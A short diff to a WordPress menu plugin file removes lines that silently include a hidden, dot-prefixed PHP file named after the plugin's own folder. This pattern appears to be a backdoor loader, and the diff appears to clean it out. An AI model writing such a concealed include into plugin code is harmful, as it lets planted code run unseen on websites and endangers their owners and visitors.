@@ -27,10 +27,6 @@ if ( 'crane' === $gm_supported_module['theme'] ) {
 
 }
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function gm_activate_action_for_crane_theme() {
 	$menu_crane_options = get_option( 'gm_menu_crane_options' );
 	if ( ! $menu_crane_options ) {
